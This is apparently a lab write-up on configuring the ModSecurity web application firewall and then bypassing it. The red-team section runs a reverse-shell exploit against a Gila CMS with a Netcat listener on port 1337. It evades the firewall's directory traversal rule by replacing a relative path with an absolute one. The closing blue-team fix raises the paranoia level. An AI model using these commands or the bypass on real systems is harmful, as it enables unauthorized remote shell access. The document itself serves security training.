### Click Header Image or Project Title to Watch The Video
[![Watch the video](https://img.youtube.com/vi/OM6aIFMuN3w/maxresdefault.jpg)](https://youtu.be/OM6aIFMuN3w)

### [Project 48 - Configuring and Bypassing Modsecurity Web Application Firewall](https://youtu.be/OM6aIFMuN3w)

In this project, I’ll be demonstrating how a defender can configure a WAF to intercept suspicious network traffic and how an attacker can circumvent that same configuration setting. A web application firewall is a security solution that monitors, filters, and blocks malicious HTTP/S traffic traveling between the internet and a web application. It acts as a protective shield, sitting directly in front of the web application to stop cyberattacks before they reach the server.

## Blue Team: Configuring ModSecurity WAF for Network Defense

Throughout the project, I will be using the free, open‑source WAF solution ModSecurity. Unlike many web application firewalls, it acts as a customizable framework that allows users to install it directly onto their own web servers.

![Image](https://github.com/darylcbrooks/project-1/blob/project-48/Project%2048%20-%20Step%2001.png)

I begin by copying the locally stored recommended configuration for ModSecurity and renaming it to “modsecurity.conf” (sudo cp /etc/modsecurity/modsecurity.conf-recommended /etc/modsecurity/modsecurity.conf). I then use the “nano” text editor to open the configuration file for editing (sudo nano /etc/modsecurity/modsecurity.conf).

![Image](https://github.com/darylcbrooks/project-1/blob/project-48/Project%2048%20-%20Step%2002.png)

Inside the configuration file, I can immediately see a few rules set in place. My attention is on the “SecRuleEngine” rule, which is currently set to “DetectionOnly.”

![Image](https://github.com/darylcbrooks/project-1/blob/project-48/Project%2048%20-%20Step%2003.png)

I change the “SecRuleEngine” setting from “DetectionOnly” to “On.” This switches ModSecurity from passive, logging-only mode to active blocking mode. This will enable the WAF to intercept questionable traffic based on its rules. After applying the change, I save and exit (Ctrl + X and Y).

![Image](https://github.com/darylcbrooks/project-1/blob/project-48/Project%2048%20-%20Step%2004.png)

For this configuration change to persist, I must restart the Apache server using the following command: sudo /etc/init.d/apache2 restart.

## Red Team: Bypassing ModSecurity’s Blocking Rule

Switching to “attacker mode,” I’m now assuming the role of a malicious actor who has already gained access to the system and now wants to connect to a remote device. This system happens to be a web server hosting a Gila content management system. CMS platforms can be primary targets for exploitation due to out‑of‑date themes and plugins being popular attack vectors. Compromising a theme and/or plugin can lead to the compromise of the content management system’s core.

![Image](https://github.com/darylcbrooks/project-1/blob/project-48/Project%2048%20-%20Step%2005.png)

I set up a Netcat listener on port 1337 to receive incoming connections. Attackers will often exploit open, uncommonly used ports such as 1337 as attack vectors.

![Image](https://github.com/darylcbrooks/project-1/blob/project-48/Project%2048%20-%20Step%2006.png)

Next, I open a new terminal and run the “su admin” command to switch to an administrator account. I then change to the “exploits” directory (cd /home/admin/exploits) and use the “ls” command to list all the files present in the directory. There are multiple Python exploitation scripts available, and I will be using the “reverse-shell-exploit.py” script in an attempt to make a connection with the remote host.

![Image](https://github.com/darylcbrooks/project-1/blob/project-48/Project%2048%20-%20Step%2007.png)

I run the following command to execute the reverse shell, specifying the web server’s address and open port:
sudo ./reverse-shell-exploit.py http://gila.ii 192.168.1.100 1337

![Image](https://github.com/darylcbrooks/project-1/blob/project-48/Project%2048%20-%20Step%2008.png)

Back in the first terminal where the listener is running, we don’t see any new activity, which implies that the ModSecurity WAF has successfully blocked the connection attempt.

![Image](https://github.com/darylcbrooks/project-1/blob/project-48/Project%2048%20-%20Step%2009.png)

Returning to the second terminal, I use the nano text editor to open the reverse shell script to gain a better understanding of how it works (sudo nano -l /home/admin/exploits/reverse-shell-exploit.py).

![Image](https://github.com/darylcbrooks/project-1/blob/project-48/Project%2048%20-%20Step%2010.png)

The red text at the top of the script informs us that it’s written to specifically exploit vulnerability CVE‑2020‑5513. CVE‑2020‑5513 allows for the disclosure of sensitive internal network information to an attacker, such as internal domain names or IP addresses.

![Image](https://github.com/darylcbrooks/project-1/blob/project-48/Project%2048%20-%20Step%2011.png)

I scroll down to line 78 and can see that this exploit attempts to include and execute the reverse shell using a relative path. This is what triggered ModSecurity to detect a directory traversal pattern (../../).

![Image](https://github.com/darylcbrooks/project-1/blob/project-48/Project%2048%20-%20Step%2012.png)

To bypass ModSecurity’s block rule, I remove the relative path (../../assets/php-reverse-shell.jpg) and replace it with the absolute path to the malicious file (/var/www/html/assets/php-reverse-shell.jpg). I save and exit after applying the change (Ctrl + X and Y).

![Image](https://github.com/darylcbrooks/project-1/blob/project-48/Project%2048%20-%20Step%2013.png)

I run the command again in another attempt to establish a connection with the Netcat listener:
sudo ./reverse-shell-exploit.py http://gila.ii 192.168.1.100 1337

![Image](https://github.com/darylcbrooks/project-1/blob/project-48/Project%2048%20-%20Step%2014.png)

I go back to the first terminal and can now see that a connection has been made and that I indeed have established a shell connection with the target.

## Blue Team: Preventing Future WAF Bypassing

![Image](https://github.com/darylcbrooks/project-1/blob/project-48/Project%2048%20-%20Step%2015.png)

To apply the proper configuration to ModSecurity to disallow this circumventing tactic, I open the core rule set configuration file for editing in the second terminal (sudo nano -l /etc/modsecurity/crs/crs-setup.conf).

![Image](https://github.com/darylcbrooks/project-1/blob/project-48/Project%2048%20-%20Step%2016.png)

In the CRS file, I scroll down to lines 176 and 182. I will need to uncomment them to enable and set the paranoia level. Think of the paranoia level as the level of sensitivity assigned to the WAF when it comes to monitored behavior.

![Image](https://github.com/darylcbrooks/project-1/blob/project-48/Project%2048%20-%20Step%2017.png)

I increase ModSecurity’s paranoia level from 1 to 2. This will increase the likelihood of its ability to detect and block a connection from an unauthorized remote host, regardless of what path is referenced in the triggering script. I save and exit after applying the change (Ctrl + X and Y).

## Conclusion

Many times, when vulnerabilities are exploited, it’s not due to the lack of security controls but due to their misconfiguration. Security controls are only as good as their configuration. You can watch the video walkthrough of this project at the top of the page. Until next time, take care of yourself and… SHOW YOUR WORK!!! 😉
